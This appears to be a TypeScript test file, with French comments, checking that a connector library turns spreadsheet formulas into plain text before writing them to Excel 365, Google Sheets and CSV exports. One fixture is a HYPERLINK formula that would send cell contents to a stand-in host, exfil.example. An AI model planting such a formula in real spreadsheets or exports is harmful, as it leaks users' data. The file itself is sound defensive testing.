/**
 * Injection de formules (constats jeu-connecteurs-4 et jeu-connecteurs-6) : un texte du jeu qui commence par = + - @,
 * une tabulation ou un retour chariot arrive dans Excel 365, dans Google Sheets (API et script) et dans les CSV
 * téléchargés comme du TEXTE, jamais comme une formule. Réponses simulées, aucun appel réseau.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { ADAPTATEURS } from './sources.ts';
import { excel365 } from './sources-microsoft.ts';
import { sansFormule } from './tableau.ts';
import { parserCsv } from './csv.ts';

interface Appel { url: URL; methode: string; corps: string | null }
function simuler(repondre: (a: Appel) => Response) {
  const appels: Appel[] = [];
  const f = (async (url: URL | string, init?: RequestInit) => {
    const a: Appel = { url: new URL(String(url)), methode: init?.method ?? 'GET', corps: init?.body ? String(init.body) : null };
    appels.push(a);
    return repondre(a);
  }) as typeof fetch;
  return { f, appels };
}
const json = (c: unknown, s = 200) => new Response(JSON.stringify(c), { status: s, headers: { 'content-type': 'application/json' } });

const FORMULE = '=HYPERLINK("https://exfil.example/?d="&A2&B2;"Voir")';

test('sansFormule : apostrophe devant = + - @ tabulation retour chariot ; nombres, négatifs seuls et vides inchangés', () => {
  for (const v of [FORMULE, '+33 6 12 34 56 78', '-2+3', '@SUM(A1:A9)', '\t=1', '\r=1', '+5']) assert.equal(sansFormule(v), `'${v}`, JSON.stringify(v));
  for (const v of ['Cave du Port', '', '-12,5', '-3', 'a=b', ' =1']) assert.equal(sansFormule(v), v, JSON.stringify(v));
  assert.equal(sansFormule(-4), -4);
  assert.equal(sansFormule(true), true);
  assert.equal(sansFormule(null), null);
});

test('Excel 365 : la cellule reçoit le texte avec apostrophe (et l’identifiant d’une nouvelle ligne aussi)', async () => {
  const { f, appels } = simuler((a) => {
    if (a.url.pathname.includes('/shares/')) return json({ id: 'ITEM1', parentReference: { driveId: 'DRIVE1' } });
    if (a.url.pathname.endsWith('/worksheets')) return json({ value: [{ name: 'Feuil1' }] });
    if (a.url.pathname.includes('usedRange')) return json({ address: 'Feuil1!A1:C2', values: [['Nom', 'commentaire', 'Montant'], ['Dupont', 'ok', 3]], text: [['Nom', 'commentaire', 'Montant'], ['Dupont', 'ok', '3']] });
    return json({});
  });
  await excel365.ecrire!({ __oauth: 'microsoft', fichier: 'https://x.sharepoint.com/:x:/r/a.xlsx', colonneId: 'Nom' }, 'jeton-acces-factice', '@nouveau', { commentaire: FORMULE, Montant: -12 }, f);
  const patch = appels.find((a) => a.methode === 'PATCH');
  assert.deepEqual(JSON.parse(patch?.corps ?? '{}').values[0], ["'@nouveau", `'${FORMULE}`, -12]);
});

test('Google Sheets par le script : setValue / appendRow reçoivent des valeurs déjà forcées en texte', async () => {
  const s = simuler(() => json({ ok: true }));
  await ADAPTATEURS.sheets.ecrire!({ script: 'https://script.google.com/macros/s/AAAAAAAAAAAAAAAA/exec', colonneId: 'Nom' }, 'secret-script-factice', null, { Nom: 'Nouveau', commentaire: FORMULE, tel: '+33 6 12 34 56 78', n: 7 }, s.f);
  const envoye = JSON.parse(s.appels[0]?.corps ?? '{}').valeurs;
  assert.deepEqual(envoye, { Nom: 'Nouveau', commentaire: `'${FORMULE}`, tel: "'+33 6 12 34 56 78", n: 7 });
});

test('CSV téléchargés : formule neutralisée, tout entre guillemets, « ; » dans un nom sans décalage', async () => {
  const { celluleCsv, texteCsv } = (await import(new URL('../../web/csv.js', import.meta.url).href)) as {
    celluleCsv: (v: unknown) => string; texteCsv: (l: unknown[][]) => string;
  };
  assert.equal(celluleCsv(FORMULE), `"'=HYPERLINK(""https://exfil.example/?d=""&A2&B2;""Voir"")"`);
  assert.equal(celluleCsv('-12,5'), '"-12,5"');
  assert.equal(celluleCsv(null), '""');
  const texte = texteCsv([['Nom', 'E-mail', 'Lien'], ['Dupont; Fils', '=1+1', 'https://jeu.exemple/f/abc']]);
  assert.equal(texte, `"Nom";"E-mail";"Lien"\r\n"Dupont; Fils";"'=1+1";"https://jeu.exemple/f/abc"\r\n`);
  // relu par l'import du jeu : trois colonnes, le « ; » reste dans le nom
  assert.deepEqual(parserCsv(texte), [['Nom', 'E-mail', 'Lien'], ['Dupont; Fils', "'=1+1", 'https://jeu.exemple/f/abc']]);
});

test('les exports CSV de l’interface passent tous par texteCsv (aucune ligne assemblée à la main)', async () => {
  const { readFile } = await import('node:fs/promises');
  const app = await readFile(new URL('../../web/app.js', import.meta.url), 'utf8');
  const exports = [...app.matchAll(/telecharger\(([^\n]*?)\.csv[`']/g)];
  assert.ok(exports.length >= 3, 'liste, modèle et liens de formulaire');
  for (const ligne of app.split('\n').filter((l) => /telecharger\([^)]*\.csv/.test(l))) assert.match(ligne, /texteCsv\(/, ligne.trim().slice(0, 120));
});
